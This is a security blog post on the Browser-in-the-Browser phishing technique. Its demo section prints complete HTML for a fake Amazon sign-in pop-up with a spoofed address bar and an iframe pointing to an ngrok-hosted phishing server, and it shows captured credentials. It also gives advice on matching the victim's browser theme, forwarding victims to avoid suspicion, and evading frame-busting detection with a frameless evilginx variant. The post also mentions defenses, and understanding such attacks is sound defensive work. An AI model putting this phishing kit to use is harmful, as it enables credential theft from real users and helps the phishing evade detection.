+++
title = "Browser-in-the-Browser (BitB) attack"
date = 2024-03-11T20:03:02+02:00
draft = false
tags = ["BitB"]
categories = ["Phishing"]
ShowToc = true
author = ["connar"]
+++

## What is the Browser-in-the-Browser attack
BitB attack is a phishing technique displayed by **mr.d0x** that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.

Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.

## How does it work
The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like "Continue with email", "Continue with Facebook" etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.

## Demo
To start off, we need to go to mr.d0x github page and get the template windows for this attack:
- https://github.com/mrd0x/BITB

The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following:
![original sso window](/posts/bitb/original_SSO_window.png)

In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:
- https://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers


Now that we have chosen a theme, let's host a phishing website. I will go with blackeye one since I have made [a post about it]({{< ref "/phishingsite" >}} "blackeye post").  
We first fire up our phishing website. It's going to be an amazon one:  
![setup phishing website](/posts/bitb/setup_phishingServer.png)

Afterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using.
The final html page should be something like the following:
```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./amazon.svg" width="20px" height="15px" id="logo">
			<span id="logo-description">Please log to your account.</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://www.amazon.com</span>
		<span id="domain-path">/signin.html</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="https://44e5-46-177-73-144.ngrok-free.app" frameBorder="0"></iframe>
</div>
</body>
<script src="script.js"></script>
</html>
```

The victim should now see the following window, which seems legitimate:
![amazon fake login](/posts/bitb/amazon_fake_login.png)

Upon entering the credentials, we should see them in our server:
![stole creds](/posts/bitb/stole_credentials.png)

We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.

## Defenses
The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.  

Later on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack.  This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.  
So if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.

## BitB without iframes
In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated ("obfuscated") approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: *Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called "Shadow DOM" in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.*

The result is a fully working, undetected to framebusters SSO window using the bitb technique:  
![frameless bitb](/posts/bitb/frameless_bitb.png)

There are many things going on in frameless BitB but **Wael Masri** does a great job explaining the ins and outs of this technique and how you could replicate it:  
<iframe width="760" height="315" src="https://www.youtube.com/embed/luJjxpEwVHI" frameborder="0" allowfullscreen></iframe>

**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://mrd0x.com/browser-in-the-browser-phishing-attack/">Mr.d0x: <i>Browser In The Browser (BITB) Attack</i></a></li>
        <li> [2] <a href="https://cofense.com/blog/browser-in-the-browser-bitb-attack-takes-advantage-of-sso-trust/">Cofense email security: <i>Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust</i></a></li>
        <li> [3] <a href="https://www.youtube.com/watch?v=ntS7WHaznjI">Infinite Logins: <i>Browser in the Browser (BITB) Phishing Technique</i></a></li>
        <li> [3] <a href="https://www.youtube.com/watch?v=luJjxpEwVHI">Wael Masri: <i>How To: Evilginx + BITB | Browser In The Browser without iframes in 2024</i></a></li>
        <li> [4] <a href="https://github.com/waelmas/frameless-bitb">waelmas: <i>frameless-bitb</i></a></li>
    </ul>
</blockquote>